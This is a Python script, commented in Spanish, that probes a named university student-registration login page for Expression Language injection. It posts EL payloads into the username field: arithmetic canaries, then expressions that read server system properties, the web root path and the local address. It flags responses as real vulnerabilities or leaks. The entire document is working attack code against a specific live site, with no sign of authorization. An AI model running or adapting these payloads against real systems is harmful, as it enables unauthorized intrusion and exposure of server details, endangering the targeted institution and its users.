#!/usr/bin/env python3
"""
Verificacion canaria de EL Injection
Objetivo: confirmar si #{expr} es evaluado en servidor
o si los "matches" son numeros que ya estaban en el HTML base.
"""
import requests, urllib3, re
urllib3.disable_warnings()

TARGET = "https://registro.uns.edu.pe:80"
LOGIN  = "/WebAlumno/faces/login.xhtml"

sess = requests.Session()
sess.verify = False
sess.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Snapshot base (sin payload) ---
print("=== Obteniendo HTML base (sin payload) ===")
r_base = sess.get(TARGET + LOGIN, timeout=15)
base_html = r_base.text
print(f"HTTP {r_base.status_code} | {len(base_html)} bytes")

vs_m = re.search(r'jakarta[.]faces[.]ViewState[^>]*value="([^"]+)"', base_html)
viewstate = vs_m.group(1) if vs_m else ""
print(f"ViewState: {viewstate[:80] if viewstate else 'NO ENCONTRADO'}")
print()

canaries = [
    ("#{111+222}",   "333"),
    ("#{999-1}",     "998"),
    ("#{7*7}",        "49"),
    ("#{13*37}",     "481"),
    ("#{100+1}",     "101"),
    ("#{systemProperties['os.name']}",          None),
    ("#{systemProperties['user.name']}",        None),
    ("#{systemProperties['jboss.home.dir']}",   None),
    ("#{systemProperties['user.dir']}",         None),
    ("#{facesContext.externalContext.realPath('/')}", None),
    ("#{request.localAddr}",                    None),
]

fields_base = {
    "frmLogueo": "",
    "frmLogueo:itUsuario": "",
    "frmLogueo:itSeguridad": "",
    "frmLogueo:kbClave": "",
    "frmLogueo:itClave": "",
    "jakarta.faces.ViewState": viewstate,
}

print("=== Test de canaries ===")
print(f"{'Payload':<50} {'Esperado':<10} {'En_base':<8} {'En_resp':<8} {'Veredicto'}")
print("-" * 100)

for payload, expected in canaries:
    try:
        post = dict(fields_base)
        post["frmLogueo:itUsuario"] = payload
        r = sess.post(TARGET + LOGIN, data=post, timeout=12, allow_redirects=True)
        resp_html = r.text

        if expected:
            in_base = expected in base_html
            in_resp = expected in resp_html
            if in_resp and not in_base:
                verdict = "[!!! VULN REAL !!!]"
            elif in_resp and in_base:
                verdict = "[FALSO POSITIVO - ya en base]"
            else:
                verdict = "[no evaluado]"
            print(f"{payload:<50} {expected:<10} {str(in_base):<8} {str(in_resp):<8} {verdict}")
        else:
            known_os = ["Linux", "Windows", "Unix", "root", "/opt", "/home", "/var", "/wildfly", "/jboss"]
            found = [s for s in known_os if s in resp_html and s not in base_html]
            new_paths = re.findall(r'(?<!["\w])[/\\][a-zA-Z0-9._/\\-]{8,}', resp_html)
            new_paths = [p for p in new_paths if p not in base_html]
            if found:
                verdict = f"[LEAK! {found}]"
            elif new_paths:
                verdict = f"[NEW PATH: {new_paths[:2]}]"
            else:
                verdict = "[sin leak]"
            print(f"{payload:<50} {'(auto)':<10} {'?':<8} {'?':<8} {verdict}")
    except Exception as e:
        print(f"{payload:<50} ERROR: {e}")

print()
print("=== Verificacion completada ===")
